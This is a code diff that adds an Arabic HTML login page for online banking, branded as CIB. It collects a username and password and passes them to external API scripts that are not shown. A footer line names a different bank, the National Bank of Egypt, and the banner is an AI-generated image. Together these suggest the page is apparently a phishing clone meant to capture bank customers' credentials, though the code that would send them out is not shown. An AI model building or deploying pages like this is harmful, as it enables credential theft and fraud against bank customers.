@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - تسجيل الدخول</title>
+    <link rel="stylesheet" href="login.css" />
+  </head>
+  <body>
+    <header class="login-header">
+      <div class="login-logo-wrap">
+        <img class="login-logo" src="img/logo.png" alt="CIB" />
+      </div>
+      <div class="login-separator" aria-hidden="true"></div>
+    </header>
+
+    <main class="login-page">
+      <h1 class="login-title">مرحباً بكم في البنك التجاري الدولي</h1>
+
+      <p class="login-subtitle">
+        من فضلك سجل الدخول ب اسم المستخدم وكلمة المرور
+      </p>
+
+      <form class="login-form" action="#" method="post" autocomplete="off">
+        <div class="field">
+          <div class="field-label">اسم المستخدم</div>
+          <input
+            class="field-input"
+            type="text"
+            name="username"
+            placeholder="ادخل اسم المستخدم"
+          />
+        </div>
+
+        <div class="field">
+          <div class="field-label">كلمة المرور</div>
+          <input
+            class="field-input"
+            type="password"
+            name="password"
+            placeholder="ادخل كلمة المرور"
+          />
+        </div>
+
+        <button class="login-btn" type="submit">تسجيل الدخول</button>
+      </form>
+
+      <p class="login-note">
+        يجمع البيانات مشفرة وصحيحة وفق معايير البنك الهلي<br />
+        المصري
+      </p>
+
+      <img
+        class="login-banner"
+        src="img/Gemini_Generated_Image_7wbegg7wbegg7wbe.png"
+        alt="البانر"
+      />
+    </main>
+    
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        initializeFormHandler('.login-form', 'login');
+      });
+    </script>
+  </body>
+</html>
+
